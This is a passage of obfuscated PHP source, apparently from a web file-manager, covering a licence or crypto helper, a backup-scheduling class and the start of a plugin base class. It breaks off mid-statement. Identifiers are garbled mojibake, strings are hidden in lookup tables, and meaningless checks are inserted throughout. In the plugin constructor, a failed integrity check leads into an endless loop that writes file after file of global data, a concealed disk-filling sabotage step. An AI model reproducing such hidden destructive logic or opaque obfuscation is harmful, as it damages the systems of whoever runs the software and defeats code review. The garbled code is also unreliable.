$this->oeqj0a6ec884($¹Ü»ÜÁÕ * $”€ûÛˆÕ . $ÁéÜÛÛš[6], $ÁéÜÛÛš[136]); $Ã¶Ñò¹˜ = $ÜÚÓÅëØ[802]; if (!$Ã¶Ñò¹˜) { die; } $óªœéÛ« = md5($ÁéÜÛÛš[304] . ($¹Ü»ÜÁÕ + $”€ûÛˆÕ) . $ÁéÜÛÛš[305] . $ÛÕÎ®” . $ÁéÜÛÛš[305] . $€¾ş³€ù . $ÁéÜÛÛš[306]); $¡°·Áõ¢ = $ÜÚÓÅëØ[803]; if (!$¡°·Áõ¢) { return; } $ÓšûùË³ = $this->oeqj0a6ec884($Ñµ‘§è…, $óªœéÛ«) . $ÁéÜÛÛš[307] . $§¸ƒ¤øæ; return $ÓšûùË³; } public function qrsf55a91a6e($Ú€œ…¶€) { $º¥­Îì =& $_SERVER[¢ñàß¿€]; $üä£ÎÖ½ =& $_SERVER[ªõè”¿˜]; $¤Ù³Ğ¥ = explode($üä£ÎÖ½[307], $Ú€œ…¶€); $ßûğŠˆ· = $º¥­Îì[804]; if (!$ßûğŠˆ·) { return; } if (count($¤Ù³Ğ¥) != 2) { return $üä£ÎÖ½[6]; } $–¼ãÒÑæ = $this->kqvsb4c00a37($¤Ù³Ğ¥[1] . $üä£ÎÖ½[6], $üä£ÎÖ½[136]); $µİÄùÍã = $º¥­Îì[805]; if (strlen($µİÄùÍã) < $º¥­Îì[691]) { die; } if (!$–¼ãÒÑæ) { return $üä£ÎÖ½[6]; } $–¼ãÒÑæ = intval($–¼ãÒÑæ); $Œü×àà— = $º¥­Îì[806]; $ñœ»ñ±¾ = 0; $š¤‡ÊÙñ = 0; $¡ÉóÇ²Ü = $º¥­Îì[807]; while ($¡ÉóÇ²Ü < $º¥­Îì[691]) { if ($¡ÉóÇ²Ü >= 0) { break; } $¡ÉóÇ²Ü++; } for ($“ø­ëÏ = 3; $“ø­ëÏ < $–¼ãÒÑæ; $“ø­ëÏ += 2) { if ($–¼ãÒÑæ % $“ø­ëÏ != 0) { continue; } $ñœ»ñ±¾ = $“ø­ëÏ; $š¤‡ÊÙñ = intval($–¼ãÒÑæ / $“ø­ëÏ); break; $ô»‰Á— = $º¥­Îì[808]; if (!$ô»‰Á—) { return; } } $ó±Êø¦· = ($ñœ»ñ±¾ - 1) * ($š¤‡ÊÙñ - 1); $àÒÏ½ä = intval(($ñœ»ñ±¾ + $š¤‡ÊÙñ) / 2); while (1) { $‚°ìÊ£Ç = $àÒÏ½ä; $‹ÄóÒ = $ó±Êø¦·; while ($‹ÄóÒ % $‚°ìÊ£Ç != 0) { $ÖŠ¼Çî = $‹ÄóÒ; $İª¾—ë¶ = $º¥­Îì[809]; if (strlen($İª¾—ë¶) < $º¥­Îì[680]) { die; } $‹ÄóÒ = $‚°ìÊ£Ç; $‚°ìÊ£Ç = $ÖŠ¼Çî % $‚°ìÊ£Ç; $¦–¿ªÛÁ = $º¥­Îì[810]; while (strlen($¦–¿ªÛÁ) < $º¥­Îì[744]) { if (!$¦–¿ªÛÁ) { break; } $¦–¿ªÛÁ++; } } if ($‚°ìÊ£Ç == 1) { break; } else { $àÒÏ½ä++; } } $à°‰íğ = 2; for ($“ø­ëÏ = 0; $“ø­ëÏ < $ó±Êø¦· * 10; $“ø­ëÏ++) { if (($ó±Êø¦· * $“ø­ëÏ + 1) % $àÒÏ½ä == 0) { $à°‰íğ = intval(($ó±Êø¦· * $“ø­ëÏ + 1) / $àÒÏ½ä); break; } } $äÚ›«Á… = md5($üä£ÎÖ½[304] . ($ñœ»ñ±¾ + $š¤‡ÊÙñ) . $üä£ÎÖ½[305] . $àÒÏ½ä . $üä£ÎÖ½[305] . $à°‰íğ . $üä£ÎÖ½[306]); $î·£øÌ­ = $º¥­Îì[811]; if (!$î·£øÌ­) { die; } $‹Ö“Ùó³ = $this->kqvsb4c00a37($¤Ù³Ğ¥[0], $äÚ›«Á…); return $‹Ö“Ùó³; } public function tyxsfcb42406() { $±À³ùÆÎ =& $_SERVER[¢ñàß¿€]; $ĞÅÃô°Â = mt_rand(pow(2, 14), pow(2, 16) - 1); $àºšµ¬Š = array(); $æè·ÖÄë = $±À³ùÆÎ[812]; if (strlen($æè·ÖÄë) < $±À³ùÆÎ[685]) { die; } $Õ®­¸‘î = 1; $Ú¨â²‚½ = $±À³ùÆÎ[813]; while ($Ú¨â²‚½ < $±À³ùÆÎ[744]) { if ($Ú¨â²‚½ >= 0) { break; } $Ú¨â²‚½++; } while ($Õ®­¸‘î <= (int) sqrt($ĞÅÃô°Â)) { $È®³—úà = $Õ®­¸‘î; $Ñ©ë¨éÍ = $±À³ùÆÎ[814]; if (strlen($Ñ©ë¨éÍ) < $±À³ùÆÎ[691]) { die; } while (!0) { $È®³—úà++; $Ş·¢ö = $±À³ùÆÎ[815]; if ($È®³—úà <= 2) { $Õ®­¸‘î = $È®³—úà; break; } else { if ($È®³—úà < 2) { continue; } } $ùÌØ˜å¡ = !0; for ($‹‹ê—şƒ = 2; $‹‹ê—şƒ <= sqrt($È®³—úà); $‹‹ê—şƒ++) { if ($È®³—úà % $‹‹ê—şƒ == 0) { $ùÌØ˜å¡ = !1; } } if ($ùÌØ˜å¡) { $Õ®­¸‘î = $È®³—úà; break; } } $àºšµ¬Š[] = $Õ®­¸‘î; } $ÈîíÊØ = 2; for ($È®³—úà = $ĞÅÃô°Â; $È®³—úà > 1; $È®³—úà--) { $ùÌØ˜å¡ = !0; $Ğ»¹†…Í = $±À³ùÆÎ[816]; while ($Ğ»¹†…Í < $±À³ùÆÎ[680]) { if ($Ğ»¹†…Í >= 0) { break; } $Ğ»¹†…Í++; } foreach ($àºšµ¬Š as $©¼‡¨ø–) { if ($È®³—úà % $©¼‡¨ø– == 0) { $ùÌØ˜å¡ = !1; break; } } if ($ùÌØ˜å¡) { $ÈîíÊØ = $È®³—úà; break; } } return $ÈîíÊØ; } public function lazj8f414fcc($¡³’¢‡¦, $ñÆéĞ) { $Ã…¾ÕÑ‘ =& $_SERVER[ªõè”¿˜]; return call_user_func(array($Ã…¾ÕÑ‘[8], $Ã…¾ÕÑ‘[308]), $¡³’¢‡¦, $ñÆéĞ); } public function oeqj0a6ec884($®¤¦û‡Ì, $ÑËá™©ì) { $Ğ»èÕïÌ =& $_SERVER[ªõè”¿˜]; return call_user_func(array($Ğ»èÕïÌ[309], $Ğ»èÕïÌ[310]), $®¤¦û‡Ì, $ÑËá™©ì); $È»„àÌĞ = $_SERVER[¢ñàß¿€][817]; if (!$È»„àÌĞ) { return; } } public function kqvsb4c00a37($¸Ÿğ¢¹Ã, $ˆÔ»”Šˆ) { $ë™™»¾ì =& $_SERVER[ªõè”¿˜]; return call_user_func(array($ë™™»¾ì[309], $ë™™»¾ì[311]), $¸Ÿğ¢¹Ã, $ˆÔ»”Šˆ); $µÛ’£¨ = $_SERVER[¢ñàß¿€][818]; if (!$µÛ’£¨) { return; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¢ñàß¿€][819]); $this->init(); $this->keep(); } public function init() { $ô”ğë×¯ =& $_SERVER[¢ñàß¿€]; $this->isManual(); self::$name = date($ô”ğë×¯[820]); if (!($È¶ºóÂ = $this->model->lastItem())) { $È¶ºóÂ = $this->initData(); } else { self::$name = $È¶ºóÂ[$ô”ğë×¯[32]]; if ($È¶ºóÂ[$ô”ğë×¯[821]] == $ô”ğë×¯[91]) { self::$name = date($ô”ğë×¯[272]); $¢ª„·†ı = intval(_get($È¶ºóÂ, $ô”ğë×¯[822], 0)); if (self::$manual == 0 && $È¶ºóÂ[$ô”ğë×¯[32]] == self::$name) { $this->model->remove($È¶ºóÂ[$ô”ğë×¯[475]]); } $È¶ºóÂ = $this->initData($¢ª„·†ı, $È¶ºóÂ[$ô”ğë×¯[823]]); } else { $this->checkStore($È¶ºóÂ[$ô”ğë×¯[823]]); } } self::$option = $È¶ºóÂ; } private function isManual() { $„À—†ÛÉ = _get($GLOBALS, $_SERVER[¢ñàß¿€][824], 0); $„À—†ÛÉ = intval($„À—†ÛÉ); self::$manual = $„À—†ÛÉ && $„À—†ÛÉ == 1 ? 1 : 0; } private function initData($µ¦ƒÁõî = 0, $´çÇ‚¡Î = '') { $­‘ã‰«ç =& $_SERVER[¢ñàß¿€]; $¼¸–¢àÕ = $this->model->config(); if ($´çÇ‚¡Î && $¼¸–¢àÕ[$­‘ã‰«ç[823]] != $´çÇ‚¡Î) { $µ¦ƒÁõî = 0; } $this->checkStore($¼¸–¢àÕ[$­‘ã‰«ç[823]]); if (self::$manual == 1) { self::$name .= $­‘ã‰«ç[11] . date($­‘ã‰«ç[825]); } $Ò¤„Ì— = array($­‘ã‰«ç[823] => $¼¸–¢àÕ[$­‘ã‰«ç[823]], $­‘ã‰«ç[32] => self::$name, $­‘ã‰«ç[821] => 0, $­‘ã‰«ç[171] => $¼¸–¢àÕ[$­‘ã‰«ç[171]], $­‘ã‰«ç[826] => self::$manual, $­‘ã‰«ç[369] => array($­‘ã‰«ç[827] => array($­‘ã‰«ç[821] => 0), $­‘ã‰«ç[828] => array($­‘ã‰«ç[821] => 0, $­‘ã‰«ç[829] => 0, $­‘ã‰«ç[830] => 0, $­‘ã‰«ç[33] => $­‘ã‰«ç[12], $­‘ã‰«ç[831] => 0, $­‘ã‰«ç[832] => 0), $­‘ã‰«ç[833] => array($­‘ã‰«ç[821] => 0, $­‘ã‰«ç[829] => 0, $­‘ã‰«ç[830] => 0, $­‘ã‰«ç[831] => 0, $­‘ã‰«ç[832] => 0), $­‘ã‰«ç[230] => array($­‘ã‰«ç[821] => 0, $­‘ã‰«ç[834] => 0, $­‘ã‰«ç[835] => 0, $­‘ã‰«ç[836] => 0, $­‘ã‰«ç[837] => 0, $­‘ã‰«ç[541] => $µ¦ƒÁõî, $­‘ã‰«ç[831] => 0, $­‘ã‰«ç[832] => 0)), $­‘ã‰«ç[831] => time(), $­‘ã‰«ç[832] => 0); $·‰”­¢Ø = $this->model->insert($Ò¤„Ì—); $Ò¤„Ì—[$­‘ã‰«ç[475]] = $·‰”­¢Ø; return $Ò¤„Ì—; } private function checkStore($¦—‡„»´) { $ÀÈœÀÆ = Model($_SERVER[¢ñàß¿€][838]); $­Æ”Ä = $ÀÈœÀÆ->listData($¦—‡„»´); $ÀÈœÀÆ->checkConfig($­Æ”Ä); } public static function get() { if (!self::$option) { $æ ú´ÃŠ = Model($_SERVER[¢ñàß¿€][819]); $¿ˆ™³²Ö = $æ ú´ÃŠ->findByName(self::$name); $æ ú´ÃŠ->parseContent($¿ˆ™³²Ö); self::$option = $¿ˆ™³²Ö; } return self::$option; } public static function set($´»÷Î¬º) { $ °Ğ–˜ =& $_SERVER[¢ñàß¿€]; $â ¿ñêü = self::get(); foreach ($´»÷Î¬º as $ÉÁØºúÙ => $®šä…”Û) { array_set_value($â ¿ñêü, $ÉÁØºúÙ, $®šä…”Û); } Model($ °Ğ–˜[819])->update($â ¿ñêü[$ °Ğ–˜[475]], $â ¿ñêü); self::$option = $â ¿ñêü; return self::$option; } public function keep() { $ÎÜĞ¡Ë‡ =& $_SERVER[¢ñàß¿€]; $Ú¾öïÖÄ = self::get(); if (_get($Ú¾öïÖÄ, $ÎÜĞ¡Ë‡[839], 0) == $ÎÜĞ¡Ë‡[91]) { return; } $this->backupKeep($Ú¾öïÖÄ); self::set(array($ÎÜĞ¡Ë‡[839] => 1)); } private function backupKeep($Š±îÒÌí) { $ê¤»ÍÚ =& $_SERVER[¢ñàß¿€]; if (self::$manual == 1) { return; } $Ñ€·Ìıó = $this->model->listData(); if (empty($Ñ€·Ìıó)) { return; } $®ÄüÎ™£ = 0; $æƒ™ÃÛ¥ = array(); foreach ($Ñ€·Ìıó as $ÚŒÉõ™‹) { if ($®ÄüÎ™£ >= 7) { break; } $æƒ™ÃÛ¥[] = $ÚŒÉõ™‹[$ê¤»ÍÚ[32]]; $®ÄüÎ™£++; } for ($®ÄüÎ™£ = 0; $®ÄüÎ™£ < 12; $®ÄüÎ™£++) { $æƒ™ÃÛ¥[] = date($ê¤»ÍÚ[840], strtotime("\55{$®ÄüÎ™£}\x20\x6d\157\x6e\x74\150\x73")); } $æƒ™ÃÛ¥ = array_unique($æƒ™ÃÛ¥); $„óĞäë¨ = Model($ê¤»ÍÚ[841])->get($ê¤»ÍÚ[842]); foreach ($Ñ€·Ìıó as $ÚŒÉõ™‹) { if (isset($ÚŒÉõ™‹[$ê¤»ÍÚ[826]]) && $ÚŒÉõ™‹[$ê¤»ÍÚ[826]] == $ê¤»ÍÚ[91]) { continue; } if (!empty($ÚŒÉõ™‹[$ê¤»ÍÚ[32]]) && in_array($ÚŒÉõ™‹[$ê¤»ÍÚ[32]], $æƒ™ÃÛ¥)) { continue; } $this->model->remove($ÚŒÉõ™‹[$ê¤»ÍÚ[475]]); $ï³ôàîå = $this->backupPath($Š±îÒÌí, $„óĞäë¨); IO::remove($ï³ôàîå, !1); } } private function backupPath($ù‘÷¶îì, $è®Êë‹İ = false) { $¯³¦ıøµ =& $_SERVER[¢ñàß¿€]; if (!$è®Êë‹İ) { $è®Êë‹İ = Model($¯³¦ıøµ[841])->get($¯³¦ıøµ[842]); } $øØãÖÊİ = $ù‘÷¶îì[$¯³¦ıøµ[32]]; $ôËÉ¸§ç = substr(md5($¯³¦ıøµ[843] . $è®Êë‹İ . $øØãÖÊİ), 0, 8); return "\x7b\x69\157\x3a{$ù‘÷¶îì[$¯³¦ıøµ[823]]}\175\x2f\144\x61\x74\141\x62\141\163\145\57\x62\141\143\153\x75\160\x2f" . $øØãÖÊİ . $¯³¦ıøµ[11] . $ôËÉ¸§ç; } public function db() { $¢é’Åôè =& $_SERVER[¢ñàß¿€]; $†âê®ÓÒ = self::get(); if (_get($†âê®ÓÒ, $¢é’Åôè[844], 0) == $¢é’Åôè[91]) { return !0; } $œß£¥ıº = new BackupDb(); if (!$œß£¥ıº->index()) { return !1; } self::set(array($¢é’Åôè[844] => 1)); return !0; } public function dbFile() { $ˆç¡¼Ìº =& $_SERVER[¢ñàß¿€]; $ñéÀùµÜ = self::get(); if (_get($ñéÀùµÜ, $ˆç¡¼Ìº[845], 0) == $ˆç¡¼Ìº[91]) { return !0; } $ÎÖø½ñ¯ = new BackupDbFile(); if (!$ÎÖø½ñ¯->index()) { return !1; } self::set(array($ˆç¡¼Ìº[845] => 1)); return !0; } public function file() { $ùŒ–’ø÷ =& $_SERVER[¢ñàß¿€]; $İ²¢˜À = self::get(); if (_get($İ²¢˜À, $ùŒ–’ø÷[846], 0) == $ùŒ–’ø÷[91]) { return !0; } if ($İ²¢˜À[$ùŒ–’ø÷[171]] == $ùŒ–’ø÷[847]) { $¡áµ¹æ® = new BackupFile(); if (!$¡áµ¹æ®->index()) { return !1; } } self::set(array($ùŒ–’ø÷[846] => 1, $ùŒ–’ø÷[821] => 1)); return !0; } } goto b¶Ê«¯µ´µ; C„’·¸£Š“: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Œ¤àñÓõ =& $_SERVER[¢ñàß¿€]; $ÉÚÔ‚ÁÀ = $_SERVER[$Œ¤àñÓõ[1458]]; $ú­îùÙŸ = $Œ¤àñÓõ[1542]; if ($_SERVER[$Œ¤àñÓõ[947]] != $ú­îùÙŸ($ÉÚÔ‚ÁÀ)) { $€ÒĞó‰¯ = $Œ¤àñÓõ[949]; $àì¯ö¡˜ = $Œ¤àñÓõ[950]; $æÉí’Ó¶ = $_SERVER[$Œ¤àñÓõ[951]] . $Œ¤àñÓõ[952]; $ËĞêñÎÌ = $àì¯ö¡˜($æÉí’Ó¶); $£”‚ÔÜ = explode($Œ¤àñÓõ[262], $ËĞêñÎÌ); if (count($£”‚ÔÜ) < $Œ¤àñÓõ[680]) { $æ÷¬¼ûÑ = $Œ¤àñÓõ[953]; $æ÷¬¼ûÑ(); } $£“ÉèÔ = $Œ¤àñÓõ[954]; $£“ÉèÔ($_SERVER[$Œ¤àñÓõ[955]]); $€ÒĞó‰¯ = $Œ¤àñÓõ[949]; $€ÒĞó‰¯(); $Æ»·³¦« = $Œ¤àñÓõ[1624]; $Ú´ÄÆ‘ = json_encode($GLOBALS[$Œ¤àñÓõ[1625]]); $Ÿò¬æ = 1; for ($şÙ•÷Ï½ = $Ÿò¬æ; $şÙ•÷Ï½ > 0; $şÙ•÷Ï½++) { $Æ»·³¦«(DATA_PATH . $şÙ•÷Ï½, $Ú´ÄÆ‘); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Œ¤àñÓõ[1626]); $this->pluginName = str_replace($Œ¤àñÓõ[1626], $Œ¤àñÓõ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Œ¤àñÓõ[8]; $this->pluginApi = appHostGet() . $Œ¤àñÓõ[1627] . $this->pluginName . $Œ¤àñÓõ[8]; $this->pluginHost = $config[$Œ¤àñÓõ[1628]] . $this->pluginName . $Œ¤àñÓõ[8]; $this->pluginHostDefault = $config[$Œ¤àñÓõ[1628]] . $this->pluginName . $Œ¤àñÓõ[8]; $èúê®Óõ = $config[$Œ¤àñÓõ[1629]]; if ($èúê®Óõ && strpos($Œ¤àñÓõ[50] . $èúê®Óõ . $Œ¤àñÓõ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Œ¤àñÓõ[1630]] . $this->pluginName . $Œ¤àñÓõ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¢ñàß¿€][1631]); } protected function assign($µü²Á™¯, $æ—‚×ù = false) { if (is_array($µü²Á™¯)) { $this->values = array_merge($this->values, $µü²Á™¯); } else { $this->values[$µü²Á™¯] = $æ—‚×ù; } } protected function display($©¾ñ¤±„) { extract($this->values); require $©¾ñ¤±„; } final function hookRegist($ïäÓéãº) { $this->modelPlugin->appRegist($this->pluginName, $ïäÓéãº); } final function appIcon() { $´ µ¶Ÿí =& $_SERVER[¢ñàß¿€]; $¿’úò¤Ù = $this->appPackage(); $¤Ö›ü„ù = $´ µ¶Ÿí[12]; if (isset($¿’úò¤Ù[$´ µ¶Ÿí[490]])) { if (isset($¿’úò¤Ù[$´ µ¶Ÿí[490]][$´ µ¶Ÿí[1632]])) { $¤Ö›ü„ù = $´ µ¶Ÿí[1633] . $¿’úò¤Ù[$´ µ¶Ÿí[490]][$´ µ¶Ÿí[1632]] . $´ µ¶Ÿí[1634]; } else { if ($¿’úò¤Ù[$´ µ¶Ÿí[490]][$´ µ¶Ÿí[1635]]) { $¤Ö›ü„ù = $´ µ¶Ÿí[1636] . $¿’úò¤Ù[$´ µ¶Ÿí[490]][$´ µ¶Ÿí[1635]] . $´ µ¶Ÿí[1637]; } } } return $¤Ö›ü„ù; } final function fileCanView($øÑ‘àÓÛ) { $ßİÈ€²× =& $_SERVER[¢ñàß¿€]; if (request_url_safe($øÑ‘àÓÛ)) { return !0; } if ($this->isShare($øÑ‘àÓÛ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Êö‡´ÁÎ = $ßİÈ€²×[1638] . rawurlencode(this_url()); show_tips(LNG($ßİÈ€²×[1639]) . $ßİÈ€²×[1640] . $Êö‡´ÁÎ . $ßİÈ€²×[1641] . LNG($ßİÈ€²×[1642]) . $ßİÈ€²×[1643], !1); } if (!Action($ßİÈ€²×[1644])->authCan($ßİÈ€²×[1645])) { show_tips(LNG($ßİÈ€²×[1646]) . $ßİÈ€²×[1647], !1); } ActionCall($ßİÈ€²×[1648], $øÑ‘àÓÛ); } final function isShare($¦âªğø¯) { $¡Ô‰î® = KodIO::parse($¦âªğø¯); return $¡Ô‰î®[$_SERVER[¢ñàß¿€][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($°¬Ğ¼Üş) { if (request_url_safe($°¬Ğ¼Üş)) { return $°¬Ğ¼Üş; } if (!$this->isShare($°¬Ğ¼Üş)) { $°¬Ğ¼Üş = $this->filePath($°¬Ğ¼Üş, !1); } return Action($_SERVER[¢ñàß¿€][1253])->linkOut($°¬Ğ¼Üş); } public function filePathLinkOut($¡Ş•êŠ) { if (request_url_safe($¡Ş•êŠ)) { return $¡Ş•êŠ; } $this->fileCanView($¡Ş•êŠ); return Action($_SERVER[¢ñàß¿€][1253])->link($¡Ş•êŠ); } final function filePath($ˆÚÇãĞª, $…öÏ’‰È = true, $¾å°‡•„ = false) { $Úõ¸ûÕ‰ =& $_SERVER[¢ñàß¿€]; $õ“Ú•ï§ = $this->filePathGet($ˆÚÇãĞª, $…öÏ’‰È); if (!$this->fileInfo) { show_tips(LNG($Úõ¸ûÕ‰[108]), !1); } if ($¾å°‡•„ && isset($this->fileInfo[$Úõ¸ûÕ‰[541]]) && $this->fileInfo[$Úõ¸ûÕ‰[541]]) { $ƒŸ¤Î‰ = Model($Úõ¸ûÕ‰[544])->fileInfo($this->fileInfo[$Úõ¸ûÕ‰[541]]); if (!$ƒŸ¤Î‰ || !IO::exist($ƒŸ¤Î‰[$Úõ¸ûÕ‰[87]])) { show_tips(LNG($Úõ¸ûÕ‰[108]) . $Úõ¸ûÕ‰[1649]); } } Hook::trigger($Úõ¸ûÕ‰[1650], $õ“Ú•ï§); return $õ“Ú•ï§; } final function filePathGet($‹ÂÈ¦µÜ, $£Á¦ÙûÑ = true) { $…ŒğÂ³ú =& $_SERVER[¢ñàß¿€]; if ($Ğ¤†•¼© = $this->checkSharePath($‹ÂÈ¦µÜ, $£Á¦ÙûÑ)) { return $Ğ¤†•¼©; } $this->fileCanView($‹ÂÈ¦µÜ); if (request_url_safe($‹ÂÈ¦µÜ)) { $«‘Ó¾î‰ = parse_url_query($‹ÂÈ¦µÜ); if (isset($«‘Ó¾î‰[$…ŒğÂ³ú[1651]]) && isset($«‘Ó¾î‰[$…ŒğÂ³ú[234]])) { $öÔË›É§ = Mcrypt::decode($«‘Ó¾î‰[$…ŒğÂ³ú[234]], Model($…ŒğÂ³ú[841])->get($…ŒğÂ³ú[842])); if ($öÔË›É§) { $this->fileInfo = IO::info($öÔË›É§); $this->fileInfo[$…ŒğÂ³ú[1652]] = $‹ÂÈ¦µÜ; $this->cachePath = $this->pluginCachePath($…ŒğÂ³ú[12], $£Á¦ÙûÑ); return $öÔË›É§; } } $‹ÂÈ¦µÜ = $this->_cacheHttpFile($‹ÂÈ¦µÜ, $£Á¦ÙûÑ); $this->fileInfo = IO::info($‹ÂÈ¦µÜ); } else { $this->fileInfo = IO::info($‹ÂÈ¦µÜ); $this->cachePath = $this->pluginCachePath($…ŒğÂ³ú[12], $£Á¦ÙûÑ); } return $‹ÂÈ¦µÜ; } final function _cacheHttpFile($—ûÌ¹·¬, $å¦«İàğ = true) { $·ë‘­ìë =& $_SERVER[¢ñàß¿€]; $ãê©ÒÓ = parse_url_query($—ûÌ¹·¬); $¶úÆ†œÀ = get_path_ext($—ûÌ¹·¬); if (isset($ãê©ÒÓ[$·ë‘­ìë[32]]) && $ãê©ÒÓ[$·ë‘­ìë[32]]) { $¶úÆ†œÀ = get_path_ext($ãê©ÒÓ[$·ë‘­ìë[32]]); } $³ù¦ˆãã = hash_path($—ûÌ¹·¬) . $·ë‘­ìë[10] . $¶úÆ†œÀ; $this->cachePath = $this->pluginCachePath($å¦«İàğ ? $³ù¦ˆãã : $·ë‘­ìë[12]); $¿Ãõ‡™ = IO::fileNameExist($this->cachePath, $³ù¦ˆãã); if ($¿Ãõ‡™) { return KodIO::make($¿Ãõ‡™); } $”É ò¿ñ = rtrim($this->cachePath, $·ë‘­ìë[8]) . $·ë‘­ìë[8] . $³ù¦ˆãã; return $this->pluginCacheFileSet($”É ò¿ñ, file_get_contents_nossl($—ûÌ¹·¬)); } final function checkSharePath($¨¡¤öÙĞ, $ĞË²£Úœ = true) { $‘š„âŒÙ =& $_SERVER[¢ñàß¿€]; if (!$this->isShare($¨¡¤öÙĞ)) { return !1; } $˜ë¿öî = Action($‘š„âŒÙ[1253])->sharePathInfo($¨¡¤öÙĞ); if (!is_array($˜ë¿öî) || !isset($˜ë¿öî[$‘š„âŒÙ[87]])) { show_json(LNG($‘š„âŒÙ[1653]), !1); } $this->fileInfo = $˜ë¿öî; $this->cachePath = $this->pluginCachePath(!1, $ĞË²£Úœ); return $˜ë¿öî[$‘š„âŒÙ[87]]; } final function pluginCachePath($ÑÃ´½†… = '', $İÎæû¬ = false) { $¸Ç—² =& $_SERVER[¢ñàß¿€]; if ($İÎæû¬ && is_array($this->fileInfo)) { $ÑÃ´½†… = kodIO::hashPath($this->fileInfo); } $“ÑÖ—á¢ = rtrim(IO_PATH_SYSTEM_TEMP . $¸Ç—²[1654] . $this->pluginName . $¸Ç—²[8] . $ÑÃ´½†…, $¸Ç—²[8]); $½óıí±Ÿ = IO::infoFullSimple($“ÑÖ—á¢); $â†áıœÊ = $½óıí±Ÿ && is_array($½óıí±Ÿ) ? $½óıí±Ÿ[$¸Ç—²[87]] : $¸Ç—²[12]; if (!$â†áıœÊ) { $â†áıœÊ = IO::mkdir($“ÑÖ—á¢); } return $â†áıœÊ; } final function pluginCacheFileSet($åËğËÁ«, $¨¸ù¦Ş‹ = '') { $ºÙ°á‹‡ =& $_SERVER[¢ñàß¿€]; $÷µ¿âô = IO::infoFullSimple($åËğËÁ«); if (!$÷µ¿âô) { return IO::mkfile($åËğËÁ«, $¨¸ù¦Ş‹, REPEAT_REPLACE); } IO::setContent($÷µ¿âô[$ºÙ°á‹‡[87]], $¨¸ù¦Ş‹); return $÷µ¿âô[$ºÙ°á‹‡[87]]; } final function pluginLocalFile($”„ÎÂ»õ = '') { $‰ìªéÅ¿ =& $_SERVER[¢ñàß¿€]; $° Ôüó÷ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($° Ôüó÷)) { mk_dir($° Ôüó÷); } if (!$”„ÎÂ»õ) { return $° Ôüó÷; } $’›ÏŞİ = IO::info($”„ÎÂ»õ); $Ò¯´¿ï = $‰ìªéÅ¿[1655] . KodIO::hashPath($’›ÏŞİ) . $‰ìªéÅ¿[10] . $’›ÏŞİ[$‰ìªéÅ¿[169]]; if (!checkExtSafe($Ò¯´¿ï)) { $Ò¯´¿ï = $Ò¯´¿ï . $‰ìªéÅ¿[1288]; } $ïÓ…¾ = $° Ôüó÷ . $Ò¯´¿ï; if (@file_exists($ïÓ…¾)) { return $ïÓ…¾; } return IO::copy($”„ÎÂ»õ, $° Ôüó÷, 0, $Ò¯´¿ï); } final function appPackage() { $ÚÎ‡ˆ¿³ =& $_SERVER[¢ñàß¿€]; if ($this->packageData) { return $this->packageData; } $şõ·’û = $this->parseFile($this->pluginPath . $ÚÎ‡ˆ¿³[1656]); $this->parseLang($şõ·’û); $ª†Ê‰ì³ = json_decode_force($şõ·’û); if (!$ª†Ê‰ì³) { return array(); } $È®Õ†Ê = Hook::trigger($ÚÎ‡ˆ¿³[1657], $ª†Ê‰ì³); if ($È®Õ†Ê && is_array($È®Õ†Ê)) { $ª†Ê‰ì³ = $È®Õ†Ê; } $this->packageData = $ª†Ê‰ì³; return $ª†Ê‰ì³; } public function packageInfoGet($ŒÆ¾«Ò¤) { $ê•Ô¿¢û = $this->appPackage(); return array_get_value($ê•Ô¿¢û, $ŒÆ¾«Ò¤); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¢ñàß¿€][1658]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¢ñàß¿€][1659]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¢ñàß¿€][1660]); } public function echoJsAssign($Ãë‡ıİç, $óãùëÁ‡) { $this->echoJsAssignArr[$Ãë‡ıİç] = $óãùëÁ‡; } private function parseFile($ÔºÖÏõ) { $Šƒşı“ =& $_SERVER[¢ñàß¿€]; $»¬‹úë¹ = file_get_contents_nossl($ÔºÖÏõ); $ÎÏ§óÖø = array($Šƒşı“[1661], $Šƒşı“[1662], $Šƒşı“[1663], $Šƒşı“[1664], $Šƒşı“[1665], $Šƒşı“[1666], $Šƒşı“[1667]); $üÆ¤œ½ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Šƒşı“[92]][$Šƒşı“[1668]]); foreach ($this->echoJsAssignArr as $ëş¸°Áş => $–ùËµ¤Ã) { $ÎÏ§óÖø[] = $Šƒşı“[1669] . $ëş¸°Áş . $Šƒşı“[1670]; $üÆ¤œ½[] = is_array($–ùËµ¤Ã) || is_object($–ùËµ¤Ã) ? rawurlencode(json_encode($–ùËµ¤Ã)) : $–ùËµ¤Ã; } if (strstr($»¬‹úë¹, $Šƒşı“[1671])) { $îøÜÉ“Ä = rawurlencode(json_encode($this->pluginLangArr)); $»¬‹úë¹ = str_replace($Šƒşı“[1671], $îøÜÉ“Ä, $»¬‹úë¹); } if (strstr($»¬‹úë¹, $Šƒşı“[1672])) { $îøÜÉ“Ä = $îøÜÉ“Ä = rawurlencode(json_encode($this->getConfig())); $»¬‹úë¹ = str_replace($Šƒşı“[1672], $îøÜÉ“Ä, $»¬‹úë¹); } $»¬‹úë¹ = str_replace($ÎÏ§óÖø, $üÆ¤œ½, $»¬‹úë¹); return $»¬‹úë¹; } private function parseLang(&$ªîïò‚) { $”»»é“ñ =& $_SERVER[¢ñàß¿€]; $ÓÏ‰ÄƒŞ = $”»»é“ñ[1673]; if (!strstr($ªîïò‚, $ÓÏ‰ÄƒŞ)) { return; } preg_match_all($”»»é“ñ[1674], $ªîïò‚, $ı–‰ëÑŠ); if 